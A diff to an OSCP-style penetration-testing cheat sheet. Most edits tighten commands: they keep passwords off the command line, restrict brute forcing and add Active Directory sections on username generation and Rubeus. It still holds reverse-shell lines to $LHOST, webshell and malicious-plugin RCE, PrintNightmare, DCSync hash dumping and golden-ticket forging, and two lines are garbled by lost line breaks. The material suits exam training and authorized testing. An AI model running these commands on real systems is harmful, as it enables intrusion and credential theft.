-evil-winrm -i $IP -u user -p pass -S            # SSL (port 5986)
-evil-winrm -i $IP -u user -p pass \
+evil-winrm -i $IP -u "$AUTH_USER" -p "$AUTH_PASS" -S            # SSL (port 5986)
+evil-winrm -i $IP -u "$AUTH_USER" -p "$AUTH_PASS" \
   -e /path/to/executables \     # Upload and exec
   -s /path/to/ps1-scripts       # Load PS1 scripts in session
 
@@ -2129,7 +2184,7 @@ evil-winrm -i $IP -u user -p pass \
 # menu    → shows available commands
 
 # ── SSL WINRM (5986) ──────────────────────────────────────────
-evil-winrm -i $IP -u user -p pass -S -P 5986
+evil-winrm -i $IP -u "$AUTH_USER" -p "$AUTH_PASS" -S -P 5986
 # Or with cert:
 evil-winrm -i $IP -c cert.pem -k key.pem -S
 ```
@@ -2211,26 +2266,29 @@ test -s "$SHORTLIST" && hydra -P "$SHORTLIST" redis://$IP -t 1 -f
 
 
 ``` bash
-# ── ENUMERATION ───────────────────────────────────────────────
-nmap --script oracle-tns-version,oracle-sid-brute -p1521 $IP
+# ── LISTENER / VERSION FIRST ─────────────────────────────────
+nmap --script oracle-tns-version -p1521 $IP
 tnscmd10g version -h $IP
 tnscmd10g status -h $IP
 
-# ── SID BRUTE FORCE ───────────────────────────────────────────
-odat sidguesser -s $IP
-hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 $IP oracle-sid
-# MSF ONE-TARGET LOCK — only after choosing this target: use auxiliary/scanner/oracle/sid_brute
+# ── SERVICE NAME / SID ────────────────────────────────────────
+# Prefer names learned from app config, errors, files or listener output.
+# If still unknown, use ONE focused discovery method and stop when you have a candidate:
+odat sidguesser -s $IP -p 1521
 
-# ── ODAT — ORACLE DATABASE ATTACK TOOL ───────────────────────
-odat all -s $IP -p 1521         # All checks
-odat passwordguesser -s $IP -d SID
-odat utlfile -s $IP -d SID -U user -P pass --sysdba --putFile /tmp shell.php "<?php system($_GET['cmd']); ?>"
+# ── AUTH — KEEP PASSWORD OUT OF THE COMMAND LINE ─────────────
+# SQL*Plus prompts for the password. Replace SID/SERVICE only after discovery.
+sqlplus -L user@//$IP:1521/SID
 
-# ── CONNECT ───────────────────────────────────────────────────
-sqlplus user/pass@$IP/SID
-sqlplus user/pass@$IP/SID as sysdba    # Priv connection
-# Common default creds:
-# sys:change_on_install | system:manager | scott:tiger | DBSNMP:DBSNMP
+# ── AFTER AUTH ────────────────────────────────────────────────
+# Record user/roles/version, then choose ONE exact ODAT/SQL path supported by evidence.
+# Do NOT run `odat all` by default. Do NOT start broad password guessing.
+# Check the installed syntax before an exact module:
+odat --help
+
+# Decision path:
+# listener/version → SID/service → justified credential → DB role/privileges
+# → exact prerequisite-backed module only if it advances the target
 ```
 
 
@@ -2251,7 +2309,7 @@ sqlplus user/pass@$IP/SID as sysdba    # Priv connection
 # ── CONNECT ───────────────────────────────────────────────────
 mongo $IP
 mongo $IP:27017
-mongo $IP/admin -u user -p pass
+mongo $IP/admin -u "$AUTH_USER" -p  # password prompt
 
 # ── ENUMERATION ───────────────────────────────────────────────
 > show dbs
@@ -2354,10 +2412,12 @@ nc -nv $IP 6667
 AB; bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
 
 # ── RSYNC (873) ───────────────────────────────────────────────
-rsync rsync://$IP/                    # List shares
+rsync rsync://$IP/                    # List modules
 rsync rsync://$IP/share               # List share contents
-rsync rsync://$IP/share /tmp/rsync/   # Download all
+# ONLY when one exact artifact is necessary to compromise the target:
+# rsync rsync://$IP/share/path/NECESSARY_FILE loot/necessary/
 rsync /tmp/shell "rsync://$IP/share/"  # Upload only after proving the module is writable
+# Do not recursively mirror a module to Kali; delete any necessary local copy after the objective.
 
 # ── CUPS (631) ────────────────────────────────────────────────
 # Printing service — often on Linux
@@ -2393,7 +2453,8 @@ psql -h $IP -U postgres -c "COPY (SELECT '') TO PROGRAM 'bash -c ''bash -i >& /d
 # ── KERBEROS (88) ─────────────────────────────────────────────
 # See Active Directory section for full Kerb attacks
 nmap --script krb5-enum-users --script-args krb5-enum-users.realm=domain.com -p88 $IP
-kerbrute userenum -d domain.com /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc $IP
+# Prefer a small evidence-derived list; avoid mega-list enumeration by default.
+kerbrute userenum -d domain.com users.txt --dc $IP -o valid_users.txt
 ```
 
 
@@ -2934,8 +2995,7 @@ oXML.Send("<command>" & Request.Form("cmd") & "</command>")
 # /uploads/shell.php
 # /files/shell.php
 # /media/shell.php
-# /images/shell.php
-# Check response for path, or fuzz:
+# /images/shell.php# Check response for path, or fuzz:
 gobuster dir -u http://$IP -w common.txt -x php,jpg,png
 
 # ── EXIFTOOL INJECTION ────────────────────────────────────────
@@ -3235,8 +3295,10 @@ wp2shell -> https://flawfence.com/blog/en/wp2shell-wordpress-rce-vulnerability-c
 wpscan --url $DOMAIN -e ap --detection-mode aggressive --api-token TOKEN --plugins-detection aggressive
 # User enum only:
 wpscan --url http://$IP -e u
-# Brute force:
-wpscan --url http://$IP -U users.txt -P rockyou.txt --password-attack wp-login
+# Password testing — LAST RESORT after lockout/rate-limit review.
+# Use only a tiny evidence-derived shortlist; never throw rockyou at the login.
+SHORTLIST=notes/wp-password-shortlist.txt
+test -s "$SHORTLIST" && wpscan --url http://$IP -U users.txt -P "$SHORTLIST" --password-attack wp-login
 # Enumerate plugins (aggressive):
 wpscan --url http://$IP -e ap --plugins-detection aggressive
 
@@ -3244,7 +3306,7 @@ wpscan --url http://$IP -e ap --plugins-detection aggressive
 /wp-login.php          # Login
 /wp-admin/             # Admin panel
 /wp-config.php         # DB credentials (try LFI!)
-/xmlrpc.php            # RPC interface (brute force vector)
+/xmlrpc.php            # RPC interface — enumerate methods first; auth testing only after lockout review
 /wp-json/wp/v2/users   # User enum (unauthenticated)
 /wp-content/uploads/   # Uploaded files
 /.git/                 # Git repo
@@ -3268,9 +3330,9 @@ EOF
 zip -r mal_plugin.zip mal_plugin/
 # Upload zip → activate → curl http://$IP/wp-content/plugins/mal_plugin/mal.php?cmd=id
 
-# Method 3: xmlrpc.php brute force + RCE
+# Method 3: xmlrpc.php auth testing + RCE — LAST RESORT, tiny shortlist only
 curl -X POST http://$IP/xmlrpc.php -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'
-# If listMethods works → use wp.getUsersBlogs for brute force
+# If listMethods works and auth testing is justified, use only an evidence-derived shortlist.
 
 # ── DRUPAL ────────────────────────────────────────────────────
 droopescan scan drupal -u http://$IP
@@ -3461,22 +3523,22 @@ phpggc Laravel/RCE1 system 'id'
     [ ] Searchsploit exact version match with public exploit
     [ ] CVE for exact service version (vsftpd 2.3.4, Apache 2.4.49 etc.)
     [ ] robots.txt/sitemap → find /admin /backup
-    [ ] WordPress → wpscan → brute admin
-    [ ] EternalBlue if SMB + Windows 7/2008
-    [ ] Drupalgeddon if Drupal detected
+    [ ] WordPress → enumerate exact core/plugin/theme versions + users; password testing only with a tiny justified shortlist after lockout review
+    [ ] MS17-010/EternalBlue only after exact vulnerability/applicability validation — OS family alone is not enough
+    [ ] Drupalgeddon only after exact Drupal version/prerequisite validation
 
     TIER 2 — Common paths:
     [ ] SQLi on login forms → admin bypass → file write → shell
     [ ] LFI → log poison → RCE
     [ ] File upload → webshell
-    [ ] Exposed .git repo → source code → hardcoded creds
+    [ ] Exposed .git repo → confirm exposure; reconstruct source only when necessary to compromise the target; delete local copy after objective
     [ ] Sensitive files in SMB shares → creds
     [ ] SNMP → process args → passwords
     [ ] Config files accessible → DB creds → more access
-    [ ] xmlrpc.php brute force (WordPress)
+    [ ] xmlrpc.php → enumerate methods; auth testing only if justified + lockout-safe
 
     TIER 3 — Dig deeper:
-    [ ] Source code review (extracted from .git or download)
+    [ ] Source review only when exposed source is necessary to compromise the target; retrieve the minimum practical set and delete local copies after the objective
     [ ] API enumeration → undocumented endpoints
     [ ] IDOR/auth bypass in web app
     [ ] XXE in XML input
@@ -3486,7 +3548,7 @@ phpggc Laravel/RCE1 system 'id'
     NEVER FORGET:
     [ ] Always try creds found on one service against ALL others
     [ ] Always enumerate new ports/services discovered after initial access
-    [ ] Always read every file found — passwords hide everywhere
+    [ ] Inspect relevant accessible files in place first — retrieve locally only an exact artifact necessary to compromise the target
 
 
 </details>
@@ -3552,7 +3614,7 @@ sudo --version
 
 # CVE-2021-1675 / CVE-2021-34527 — PrintNightmare
 # Requires: Print Spooler running + writable share or SMB
-python3 CVE-2021-1675.py domain/user:pass@$IP '\\LHOST\share\evil.dll'
+python3 CVE-2021-1675.py "$DOMAIN/$AUTH_USER@$TARGET" '\\LHOST\share\evil.dll'  # omit :password; prefer the PoC's interactive prompt
 
 # CVE-2019-14287 — sudo -u#-1 bypass (sudo < 1.8.28)
 # If sudoers: user ALL=(ALL,!root) /bin/bash
@@ -3653,8 +3715,9 @@ test -s "$SHORTLIST" && medusa -h $IP -u admin -P "$SHORTLIST" -M ftp -T 2
 test -s "$SHORTLIST" && nxc smb $IP -u admin -p "$SHORTLIST"
 test -s "$SHORTLIST" && nxc ssh $IP -u admin -p "$SHORTLIST"
 [ -s "$SHORTLIST" ] && [ -s "$USERS" ] && nxc winrm $IP -u "$USERS" -p "$SHORTLIST"
-# Single password spray:
-nxc smb $IP -u users.txt -p 'Password123' --continue-on-success
+# One-password validation across a tiny confirmed-user shortlist:
+# Lockout-aware only: $USERS = evidence-derived shortlist; AUTH_PASS is session-only.
+[ -s "$USERS" ] && nxc smb "$TARGET" -u "$USERS" -p "$AUTH_PASS" --continue-on-success
 # Output: green [+] = valid, red [-] = invalid
 ```
 
@@ -3757,8 +3820,8 @@ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 # NTLM hash is the last field
 
 # From live system (with admin):
-impacket-secretsdump domain/admin:pass@$IP
-impacket-secretsdump -just-dc-ntlm domain/admin:pass@$IP   # NTDS only
+impacket-secretsdump domain/admin@$IP  # password prompt
+impacket-secretsdump -just-dc-ntlm domain/admin@$IP  # password prompt   # NTDS only
 
 # Responder poisoning/spoofing commands are intentionally omitted.
 # If passive visibility is useful, use analyze mode only: sudo responder -I tun0 -A
@@ -3931,11 +3994,11 @@ If the answer is "nothing", rotate to another target or another service.
 > known, in-scope services and stop when a stronger signal appears.
 
 ### 1. Establish ground truth before blaming the credential
-
 ```bash
 export DOMAIN='domain.local'
 export DC='dc01.domain.local'
 export DC_IP='10.10.10.10'
+export BASE_DN='DC=domain,DC=local'
 export AUTH_USER='issued.user'
 export AUTH_PASS='issued-password'
 
@@ -3969,7 +4032,7 @@ share access, WinRM logon rights or administrative execution.
 ### 3. Request high-signal domain data
 
 ```bash
-impacket-GetUserSPNs "$DOMAIN/$AUTH_USER:$AUTH_PASS" -dc-ip "$DC_IP" -request -outputfile kerberoast.txt
+impacket-GetUserSPNs "$DOMAIN/$AUTH_USER" -dc-ip "$DC_IP" -request -outputfile kerberoast.txt  # password prompt; avoids @/: parser ambiguity
 # After saving confirmed usernames:
 impacket-GetNPUsers "$DOMAIN/" -dc-ip "$DC_IP" -request -no-pass -usersfile users.txt -outputfile asrep.txt
 
@@ -4014,6 +4077,37 @@ visibility. Baseline again instead of assuming equivalence.
 
 <details>
 
+<summary>🧭 9.0B AD Ten-Case Sanity Map — OSCP-Safe</summary>
+
+> This is a **recognition map, not a checklist to execute top-to-bottom**.
+> Current evidence, the exact prerequisite, and current OffSec rules choose the
+> next action. The practical exam chain is:
+> **context → identity → roast/visibility → graph → exact edge → usable access →
+> local privesc/credential discovery → re-collect → domain objective → evidence**.
+
+| # | Technique | OSCP stance | Decisive prerequisite / next thought |
+|---|---|---|---|
+| 1 | LLMNR / NBT-NS poisoning | **BLOCKED ACTION** | Do not poison/spoof. Responder analyze mode or passive capture only. |
+| 2 | Password spraying | **GUARDED** | Read lockout policy, use a tiny evidence-derived set, and prefer one-host credential reuse first. |
+| 3 | Kerberoasting | **CORE** | An SPN/service account exists; request a TGS and crack offline only when justified. |
+| 4 | AS-REP roasting | **CORE** | A confirmed user has Kerberos pre-auth disabled. `KDC_ERR_PREAUTH_REQUIRED` alone is *not* roastability. |
+| 5 | NTLM relay / coercion | **RULE-SENSITIVE** | Not a default exam path. Never combine with prohibited spoofing/poisoning; verify current rules before acting. |
+| 6 | Pass-the-Hash | **CORE** | You possess valid NTLM material and the target protocol supports hash authentication. Prove authorization separately. |
+| 7 | ACL / ACE abuse | **CORE** | BloodHound/manual LDAP proves the exact source→target right. Read/backup first; make the minimum reversible change. |
+| 8 | DCSync | **CONDITIONAL** | Replication rights are proven. Dump the one account required by the next step before considering broader collection. |
+| 9 | AD CS abuse | **CORE / CONDITIONAL** | CA + enabled template + effective enrollment/control prerequisites line up for the exact ESC path. |
+| 10 | Golden Ticket | **LATE / OPTIONAL** | KRBTGT material + domain SID. Usually unnecessary once the exam objective is already achieved; do not add persistence just for the report. |
+
+**Mental shortcut:** the image-style “Top 10” is useful only as a coverage
+reminder. In the exam, prioritize the issued credential, DNS/time, SMB/LDAP,
+Kerberos visibility, BloodHound outgoing control, AD CS, one proven lateral
+edge, local Windows enumeration, and immediate evidence capture.
+
+</details>
+
+
+<details>
+
 
 <summary>🗺️ 9.1 AD Attack Flow Overview</summary>
 
@@ -4046,11 +4140,12 @@ REPEAT ENUMERATION WITH EVERY NEW IDENTITY
 Quick commands:
 
 ```bash
-nxc smb $DC -u "$USER" -p "$PASS" -d "$DOMAIN"
-nxc smb $DC -u "$USER" -p "$PASS" -d "$DOMAIN" --shares
-nxc ldap $DC -u "$USER" -p "$PASS" -d "$DOMAIN" --users
-nxc ldap $DC -u "$USER" -p "$PASS" -d "$DOMAIN" --groups
-nxc winrm <TARGETS> -u "$USER" -p "$PASS" -d "$DOMAIN"
+nxc smb "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"
+nxc smb "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" --shares
+nxc ldap "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" --users
+nxc ldap "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" --groups
+# Validate one justified WinRM host first; expand only from observed reachability / Credential Debt.
+nxc winrm "$TARGET" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"
 ```
 
 **BloodHound rule:** do not look only for "shortest path to Domain Admin". Inspect the current user's **outgoing object control**, group membership, writable objects, delegation relationships, session/admin relationships and certificate-related paths. Re-run/re-interpret the graph whenever you obtain a new identity.
@@ -4078,7 +4173,7 @@ nxc winrm <TARGETS> -u "$USER" -p "$PASS" -d "$DOMAIN"
       ├── Kerberoast / AS-REP material → save → identify → crack if justified
       ├── BloodHound: current principal's outgoing control and shortest owned paths
       ├── ACL, delegation, LAPS, gMSA and AD CS prerequisites
-      └── Translate one exact edge through the V19 prove/act/verify/restore desk
+      └── Translate one exact edge through the prove/act/verify/restore desk
 
     PHASE 3: LATERAL MOVEMENT
       ├── Test each new credential only on appropriate exposed in-scope services
@@ -4117,10 +4212,18 @@ nxc smb $IP --shares -u 'guest' -p ''
 enum4linux -a $IP 2>/dev/null | tee loot/ad/enum4linux.txt
 
 # ── KERBRUTE USER ENUM ────────────────────────────────────────
-kerbrute userenum -d $DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc $IP
-kerbrute userenum -d $DOMAIN /usr/share/seclists/Usernames/Names/names.txt --dc $IP
-# Save valid users:
+# Start with evidence-derived users/names; keep enumeration bounded.
+# Build users.txt from issued context, pages/docs/email, RPC/LDAP, or username-anarchy.
 kerbrute userenum -d $DOMAIN users.txt --dc $IP -o valid_users.txt
+# Do not jump to huge generic username lists unless a specific clue justifies it.
+
+# Names found in pages/docs/email but username format is unknown? Generate candidates FIRST.
+# Preferred: built-in app generator (offline, dedupe, convention inference).
+# Then validate them with Kerbrute/RPC/LDAP. Do not jump straight to password spraying.
+# Example input: Firstname,Lastname (CSV/TAB/space-delimited formats are supported).
+./username-anarchy --input-file names.txt > username_candidates.txt
+# Once one real format is known, reduce noise by selecting only that format, e.g.:
+./username-anarchy --input-file names.txt --select-format first.last > username_candidates.txt
 
 # ── RPC USER ENUM (null session) ──────────────────────────────
 rpcclient -U "" -N $IP -c "enumdomusers"
@@ -4140,6 +4243,55 @@ ldapdomaindump $IP -o loot/ad/ldapdump 2>/dev/null   # No auth attempt
 
 </details>
 
+
+<details>
+<summary>👤 9.2A AD Username Candidate Generation — Offline First</summary>
+
+> **Goal:** convert real names already discovered in scope into a small username hypothesis list. Generation itself is offline. A candidate is **not** a valid account until Kerberos/LDAP/RPC proves it.
+
+### Fastest path in the app
+
+Open **Windows / AD → AD username candidate generator**. Paste one real name per line, keep only the most plausible formats, and use **Infer convention** if you already know one real `name → username` pair. The generator normalizes accents/punctuation, deduplicates, optionally clamps a classic `sAMAccountName` hypothesis to 20 characters, and exports `username_candidates.txt`. It does **not** store the names or perform network/password testing.
+
+### Pattern priority
+
+```text
+Start small:
+  first.last   → john.smith
+  flast        → jsmith
+  firstl       → johns
+  firstlast    → johnsmith
+  first        → john
+
+Only add more patterns when evidence justifies them:
+  f.last       → j.smith
+  first_last   → john_smith
+  first-last   → john-smith
+  last.first   → smith.john
+  lastf        → smithj
+  last         → smith
+```
+
+If one observed employee account proves the convention, **stop generating unrelated formats** and apply only that convention to the remaining evidence-derived names.
+
+```bash
+# External fallback when username-anarchy is already installed:
+./username-anarchy --input-file names.txt > username_candidates.txt
+
+# Once the real convention is known, reduce noise:
+./username-anarchy --input-file names.txt --select-format first.last > username_candidates.txt
+
+# Validate usernames only — NOT a password spray:
+kerbrute userenum -d "$DOMAIN" username_candidates.txt --dc "$DC_IP" -o loot/valid-users.txt
+
+# Native/manual alternatives:
+rpcclient -U "" -N "$DC_IP" -c "enumdomusers"
+ldapsearch -x -H "ldap://$DC_IP" -b "$BASE_DN" '(objectClass=user)' sAMAccountName
+```
+
+**Important:** username enumeration and password testing are different steps. Review lockout policy before any authentication attempts. Generated candidates should stay evidence-derived and bounded.
+
+</details>
 
 <details>
 
@@ -4183,7 +4335,7 @@ hashcat -m 18200 asrep_hashes.txt rockyou.txt
 
 # ── KERBEROASTING ─────────────────────────────────────────────
 # With valid credentials:
-impacket-GetUserSPNs "$DOMAIN/$AUTH_USER:$AUTH_PASS" -dc-ip "$DC_IP" -request -outputfile kerb_hashes.txt
+impacket-GetUserSPNs "$DOMAIN/$AUTH_USER" -dc-ip "$DC_IP" -request -outputfile kerb_hashes.txt  # password prompt
 impacket-GetUserSPNs "$DOMAIN/$AUTH_USER" -dc-ip "$DC_IP" -request -no-pass -k -outputfile kerb_hashes.txt  # With ccache
 # From Windows:
 Rubeus.exe kerberoast /format:hashcat /outfile:kerb_hashes.txt
@@ -4203,7 +4355,7 @@ bloodyAD -H "$DC" -i "$DC_IP" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" get o
 
 # ── PASS THE TICKET ───────────────────────────────────────────
 # Get TGT:
-impacket-getTGT "$DOMAIN/$AUTH_USER:$AUTH_PASS" -dc-ip "$DC_IP"           # → user.ccache
+impacket-getTGT "$DOMAIN/$AUTH_USER" -dc-ip "$DC_IP"           # → user.ccache
 impacket-getTGT "$DOMAIN/$AUTH_USER" -hashes ":$NT_HASH" -dc-ip "$DC_IP"
 export KRB5CCNAME=/path/to/user.ccache
 # Use with impacket:
@@ -4211,9 +4363,12 @@ impacket-psexec $DOMAIN/user@target -no-pass -k
 impacket-smbclient $DOMAIN/user@target -no-pass -k
 impacket-wmiexec $DOMAIN/user@target -no-pass -k
 # From Windows — Rubeus:
-Rubeus.exe asktgt /user:user /password:pass /domain:$DOMAIN /dc:$IP /ptt
-Rubeus.exe ptt /ticket:base64ticket
-klist    # Verify
+# Rubeus has no interactive password prompt. If a password-only Windows path is
+# necessary, substitute it only at execution time and do NOT save the literal
+# secret in notes, Command Journal, screenshots, or browser-persisted state.
+Rubeus.exe asktgt /user:<USER> /password:<PASSWORD> /domain:<DOMAIN> /dc:<DC_FQDN> /ptt
+Rubeus.exe ptt /ticket:<KIRBI_OR_BASE64>
+klist    # Verify the ticket actually landed in this logon session
 
 # ── OVERPASS THE HASH ─────────────────────────────────────────
 # Convert NTLM hash to Kerberos ticket:
@@ -4235,9 +4390,9 @@ impacket-psexec $DOMAIN/administrator@server.domain.com -no-pass -k
 # ── GOLDEN TICKET ─────────────────────────────────────────────
 # Requires: KRBTGT hash + Domain SID
 # Get domain SID:
-impacket-lookupsid $DOMAIN/user:pass@$IP | grep "Domain SID"
+impacket-lookupsid $DOMAIN/user@$IP | grep "Domain SID"
 # Get KRBTGT hash (DCSync required — need DA or replication rights):
-impacket-secretsdump $DOMAIN/admin:pass@$IP -just-dc-user krbtgt
+impacket-secretsdump $DOMAIN/admin@$IP -just-dc-user krbtgt
 # Forge:
 impacket-ticketer -nthash KRBTGT_NTLM -domain-sid S-1-5-21-xxx -domain $DOMAIN administrator
 export KRB5CCNAME=administrator.ccache
@@ -4251,6 +4406,65 @@ Rubeus.exe diamond /tgtdeleg /ticketuser:user /ticketuserid:500 /groups:512
 
 
 </details>
+
+
+<details>
+
+<summary>🧭 9.4A Rubeus — Windows-Side Kerberos Material Router</summary>
+
+> **Use Rubeus when the useful Kerberos context is on a Windows foothold.** From Kali, Impacket is usually cleaner for password-prompted TGT/TGS work. Do not switch tools because of a Kerberos error until DNS, FQDN, DC identity and clock skew are checked.
+
+| What you actually have | First Rubeus action | Success means | Next move |
+|---|---|---|---|
+| Existing Windows logon/session | `klist` → `Rubeus.exe triage` | Tickets/logon context are visible | Use the existing ticket/session before minting anything new |
+| Confirmed usernames, no password | `Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt` | A roastable account actually returns hash material | Crack offline only if justified; `PREAUTH_REQUIRED` alone is not roastability |
+| Valid domain context + specific SPN/service account | `Rubeus.exe kerberoast /user:<TARGET_USER> /format:hashcat /nowrap /outfile:kerb_hashes.txt` | A TGS hash is returned | Crack offline; reuse only if the password is recovered |
+| NTLM hash | `Rubeus.exe asktgt /user:<USER> /rc4:<NTLM> /domain:<DOMAIN> /dc:<DC_FQDN> /ptt` | `klist` shows a TGT in the intended session | Use Kerberos-aware access against the exact host/SPN |
+| AES256 key | `Rubeus.exe asktgt /user:<USER> /aes256:<AES256> /domain:<DOMAIN> /dc:<DC_FQDN> /ptt` | TGT is present | Continue with the exact Kerberos service path |
+| `.kirbi` / base64 TGT or TGS | `Rubeus.exe ptt /ticket:<KIRBI_OR_BASE64>` | Ticket is injected into the current logon session | `klist`, then test the exact service/FQDN |
+| Username + password only | Prefer `impacket-getTGT "$DOMAIN/$AUTH_USER" -dc-ip "$DC_IP"` from Kali so the password is prompted | TGT/ccache exists without putting the password in a saved command | Export `KRB5CCNAME`; use `-k -no-pass` |
+| Delegation/S4U edge from BloodHound | **Do not guess a generic `s4u` command** | Exact source account, delegation type, target SPN and impersonated user are proven | Open the delegation/ACL workflow and build the command from those prerequisites |
+
+```powershell
+# Read-only inventory first
+klist
+Rubeus.exe triage
+Rubeus.exe dump /nowrap
+
+# Ticket injection / verification
+Rubeus.exe ptt /ticket:<KIRBI_OR_BASE64>
+klist
+
+# If the current ticket state is confusing, prefer a fresh logon/process context.
+# Do not blindly purge useful tickets in the only working session.
+```
+
+**Failure decoder:** `KRB_AP_ERR_SKEW` → time; `KDC_ERR_S_PRINCIPAL_UNKNOWN` → FQDN/SPN/DNS; `KRB_AP_ERR_MODIFIED` → wrong service identity/stale or duplicate SPN/ticket context; usage/import errors → read the installed Rubeus help before changing the attack hypothesis.
+
+</details>
+
+<details>
+
+<summary>🔁 9.4B Password Expired / Must Change — Mutation-Safe Recovery</summary>
+
+Use this only after an explicit signal such as `STATUS_PASSWORD_MUST_CHANGE`, `STATUS_PASSWORD_EXPIRED`, or `KDC_ERR_KEY_EXPIRED`. That often means the credential is **valid but policy-restricted**. Do not discard it or start spraying alternatives.
+
+```bash
+# Read installed syntax first. Omitting password/newpass keeps them out of the saved command and lets the tool prompt.
+impacket-changepasswd -h
+
+# Self-service change with current password (SAMR over SMB is the normal default).
+impacket-changepasswd "$DOMAIN/$AUTH_USER@$DC"
+
+# Existing Kerberos/ccache context, when kpasswd is supported:
+KRB5CCNAME=/absolute/path/user.ccache \
+  impacket-changepasswd -protocol kpasswd "$DOMAIN/$AUTH_USER@$DC" -k -no-pass -dc-ip "$DC_IP"
+```
+
+**Before mutating:** record the exact error, principal, target/DC, credential provenance and time. A password change can invalidate sessions/tickets and password-history policy may prevent restoring the old value. `-reset` is a different operation requiring a proven reset/admin right — do **not** use it merely because self-change failed. After success, update the Credential Matrix once and revalidate only the blocked service.
+
+</details>
+
 
 
 <details>
@@ -4357,7 +4571,7 @@ SHADOW CREDENTIALS
         ↓
 AD CS / ESC1–ESC17
         ↓
-RELAY / COERCION WHERE APPLICABLE
+RELAY / COERCION ONLY WITH AN EXACT, CURRENT-RULE-CHECKED HYPOTHESIS
         ↓
 LATERAL MOVEMENT
         ↓
@@ -4367,11 +4581,11 @@ DC / DCSYNC / DOMAIN COMPROMISE
 ### First-pass commands
 
 ``` bash
-nxc smb <DC> -u 'USER' -p 'PASS' -d DOMAIN
-nxc ldap <DC> -u 'USER' -p 'PASS' -d DOMAIN
-nxc ldap <DC> -u 'USER' -p 'PASS' -d DOMAIN --users
-nxc ldap <DC> -u 'USER' -p 'PASS' -d DOMAIN --groups
-nxc ldap <DC> -u 'USER' -p 'PASS' -d DOMAIN --computers
+nxc smb $DC -u "$AUTH_USER" -p "$AUTH_PASS" -d $DOMAIN
+nxc ldap $DC -u "$AUTH_USER" -p "$AUTH_PASS" -d $DOMAIN
+nxc ldap $DC -u "$AUTH_USER" -p "$AUTH_PASS" -d $DOMAIN --users
+nxc ldap $DC -u "$AUTH_USER" -p "$AUTH_PASS" -d $DOMAIN --groups
+nxc ldap $DC -u "$AUTH_USER" -p "$AUTH_PASS" -d $DOMAIN --computers
 ```
 
 ### Credentials → service matrix
@@ -4411,9 +4625,9 @@ DPAPI secret
 
 <details>
 
-<summary>🧭 9.6B V19 BloodHound Edge Execution Desk — Prove, Act, Verify, Restore</summary>
+<summary>🧭 9.6B BloodHound Edge Execution Desk — Prove, Act, Verify, Restore</summary>
 
-`[DECISION:AD]` `[AD:ACL]` `[AD:EDGE]` `[V19:ROLLBACK]`
+`[DECISION:AD]` `[AD:ACL]` `[AD:EDGE]` `[ROLLBACK]`
 
 > A BloodHound edge is a capability claim, not proof that your current
 > credential, ticket, token, route, protocol, session, target policy or tool
@@ -4427,6 +4641,7 @@ DPAPI secret
 export DOMAIN='domain.local'
 export DC='dc01.domain.local'
 export DC_IP='10.10.10.10'
+export BASE_DN='DC=domain,DC=local'
 export AUTH_USER='issued.user'
 export AUTH_PASS='issued-password'
 
@@ -4647,8 +4862,8 @@ nxc rdp "$TARGET_HOST" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"
 
 # Choose ONE exposed and authorized protocol.
 evil-winrm -i "$TARGET_HOST" -u "$AUTH_USER" -p "$AUTH_PASS"
-impacket-wmiexec "$DOMAIN/$AUTH_USER:$AUTH_PASS@$TARGET_HOST"
-impacket-psexec "$DOMAIN/$AUTH_USER:$AUTH_PASS@$TARGET_HOST"
+impacket-wmiexec "$DOMAIN/$AUTH_USER@$TARGET_HOST"
+impacket-psexec "$DOMAIN/$AUTH_USER@$TARGET_HOST"
 xfreerdp3 /v:"$TARGET_HOST" /u:"$AUTH_USER" /p:"$AUTH_PASS" /d:"$DOMAIN" /cert:tofu
 ```
 
@@ -4660,7 +4875,7 @@ the new session.
 ### ReadLAPSPassword
 
 ```bash
-impacket-GetLAPSPassword "$DOMAIN/$AUTH_USER:$AUTH_PASS" \
+impacket-GetLAPSPassword "$DOMAIN/$AUTH_USER" \
   -dc-ip "$DC_IP" -computer "$EDGE_TARGET"
 # Consult local -h and add -ldaps only when required by the DC/environment.
 
@@ -4712,7 +4927,7 @@ against AD, but its output is highly sensitive and must be protected.
 6. Retry the same hypothesis once after fixing the proved cause. If nothing new
    appears, record the missing prerequisite and rotate.
 
-### Sources frozen for V19
+### Sources / validation notes
 
 - SpecterOps BloodHound CE edge documentation: GenericAll, GenericWrite,
   WriteDacl, WriteOwner, AddMember, ForceChangePassword,
@@ -4778,8 +4993,7 @@ Key questions:
 -   [ ] Can the requester control subject/SAN?
 -   [ ] Does the certificate permit authentication?
 -   [ ] Is manager approval required?
--   [ ] Are authorized signatures required?
--   [ ] How is the certificate mapped to an AD principal?
+-   [ ] Are authorized signatures required?-   [ ] How is the certificate mapped to an AD principal?
 -   [ ] Can the CA itself be abused?
 
 
@@ -4850,10 +5064,10 @@ CAN IT BE CHAINED TO ANOTHER OBJECT?
 ``` bash
 # ── DCSYNC (get all hashes) ───────────────────────────────────
 # Requires: DCSync rights (DA, or granted via ACL)
-impacket-secretsdump $DOMAIN/admin:pass@$DC
-impacket-secretsdump $DOMAIN/admin:pass@$DC -just-dc-ntlm   # NTLM only
-impacket-secretsdump $DOMAIN/admin:pass@$DC -just-dc-user Administrator
-impacket-secretsdump $DOMAIN/admin:pass@$DC -outputfile loot/hashes/domain_hashes
+impacket-secretsdump $DOMAIN/admin@$DC
+impacket-secretsdump $DOMAIN/admin@$DC -just-dc-ntlm   # NTLM only
+impacket-secretsdump $DOMAIN/admin@$DC -just-dc-user Administrator
+impacket-secretsdump $DOMAIN/admin@$DC -outputfile loot/hashes/domain_hashes
 # Mimikatz:
 lsadump::dcsync /domain:$DOMAIN /user:krbtgt
 lsadump::dcsync /domain:$DOMAIN /all /csv
@@ -4873,10 +5087,12 @@ impacket-wmiexec $DOMAIN/Administrator@$IP -hashes :NTLMHASH
